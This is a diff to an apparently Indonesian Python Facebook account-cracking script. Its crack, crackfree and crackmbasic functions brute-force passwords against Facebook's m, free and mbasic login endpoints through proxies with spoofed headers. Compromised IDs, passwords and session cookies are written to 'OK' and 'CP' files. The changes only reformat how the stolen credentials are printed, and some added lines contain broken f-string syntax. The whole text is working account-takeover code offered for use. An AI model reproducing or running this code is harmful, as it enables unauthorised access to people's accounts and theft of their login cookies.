@@ -511,8 +511,10 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x} * --> {x}{K}{idf}|{pw}')
-				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
+				print(f'\r{x} {P}>>>[ RESULTS {x}{kk}{cpc} {P}]<<<\n')
+				print(f'\r{x} {P}ID {kk}> {x}{P}{idf}\n')
+				print(f'\r{x} PASSWORD {kk> {x}{P}{pw}\n')
+				print(f'\r{x} * USER AGENT {kk}> {x}{M}{ua}{M}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				
 				akun.append(idf+'|'+pw)
@@ -522,9 +524,11 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{x} * --> {H}{idf}|{pw}')
-				print(f'\r{x} * --> {x}{H}{kuki}{H}')
-				print(f'\r{x} * --> {x}{M}{ua}{M}\n')
+				print(f'\r{x} {P}>>>[ RESULTS {x}{H}{okc} {P}]<<<\n')
+				print(f'\r{x} {P}ID {H}> {x}{P}{idf}\n')
+				print(f'\r{x} {P}PASSWORD {H}> {x}{P}{pw}\n')
+				print(f'\r{x} {P}COOKIE {H}> {x}{P}{kuki}{H}\n')
+				print(f'\r{x} {P}USER AGENT {H}> {x}{M}{ua}{M}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 			
 				cek_apk(session,coki)
@@ -557,8 +561,10 @@ def crackfree(idf,pwv):
 			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fwww.ekingsnews.com%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x} * >>> {x}{K}{idf}|{pw}')
-				print(f'\r{x} * >>> {x}{M}{ua}{M}\n')
+				print(f'\r{x} {P}>>>[ RESULTS {x}{kk}{cpc} {P}]<<<\n')
+				print(f'\r{x} {P}ID {kk}> {x}{P}{idf}\n')
+				print(f'\r{x} PASSWORD {kk> {x}{P}{pw}\n')
+				print(f'\r{x} * USER AGENT {kk}> {x}{M}{ua}{M}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				
 				akun.append(idf+'|'+pw)
@@ -568,9 +574,11 @@ def crackfree(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{x} * >>> {H}{idf}|{pw}')
-				print(f'\r{x} * >>> {x}{H}{kuki}{H}')
-				print(f'\r{x} * >>> {x}{M}{ua}{M}\n')
+				print(f'\r{x} {P}>>>[ RESULTS {x}{H}{okc} {P}]<<<\n')
+				print(f'\r{x} {P}ID {H}> {x}{P}{idf}\n')
+				print(f'\r{x} {P}PASSWORD {H}> {x}{P}{pw}\n')
+				print(f'\r{x} {P}COOKIE {H}> {x}{P}{kuki}{H}\n')
+				print(f'\r{x} {P}USER AGENT {H}> {x}{M}{ua}{M}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				
 				cek_apk(session,coki)
@@ -605,8 +613,10 @@ def crackmbasic(idf,pwv):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r>>>{x}{K}RESULTS  {cpc}\n{K}{idf}|{pw}')
-				print(f'\r {x}{M}{ua}{M}\n')
+				print(f'\r{x} {P}>>>[ RESULTS {x}{kk}{cpc} {P}]<<<\n')
+				print(f'\r{x} {P}ID {kk}> {x}{P}{idf}\n')
+				print(f'\r{x} PASSWORD {kk> {x}{P}{pw}\n')
+				print(f'\r{x} * USER AGENT {kk}> {x}{M}{ua}{M}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -615,8 +625,11 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r[][]{H}RESULTS  {okc}\n {H}{idf}|{pw}')
-				print(f'\r{H}{kuki}{H}')
+				print(f'\r{x} {P}>>>[ RESULTS {x}{H}{okc} {P}]<<<\n')
+				print(f'\r{x} {P}ID {H}> {x}{P}{idf}\n')
+				print(f'\r{x} {P}PASSWORD {H}> {x}{P}{pw}\n')
+				print(f'\r{x} {P}COOKIE {H}> {x}{P}{kuki}{H}\n')
+				print(f'\r{x} {P}USER AGENT {H}> {x}{M}{ua}{M}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				
 				cek_apk(session,coki)
